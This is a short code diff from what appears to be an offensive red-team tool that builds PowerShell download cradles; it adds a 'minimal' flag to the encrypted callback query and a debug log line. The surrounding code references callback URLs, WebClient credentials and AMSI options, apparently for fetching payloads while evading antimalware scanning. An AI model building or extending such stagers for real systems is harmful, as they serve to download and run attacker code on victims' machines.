@@ -171,9 +171,14 @@ def build_cradle_webclient(get_args, key):
                        "DefaultCredentials;")
 
         url = callback_urls[get_args['Transport']]
+
         query = "/?t=%(Transport)s&a=%(Amsi)s&k=%(KEX)s" % get_args
         if not get_args['ClipExec'] == 'none':
             query += "&c=%(ClipExec)s" % get_args['ClipExec']
+
+        if get_args['Minimal'] == 'true':
+            query += "&m=t"
+
         query = encrypt_aes(query, key)
         # Make b64 encoding urlsafe
         query = query.replace('/', '_').replace('+', '-')
@@ -190,6 +195,7 @@ def build_cradle_webclient(get_args, key):
 
 def build_cradle(get_args, key):
     """Build the download crade given a dict of GET arguments"""
+    log.debug("GET arguments: %s" % get_args)
 
     result = ""
     key_var = symbol_name('global_key')
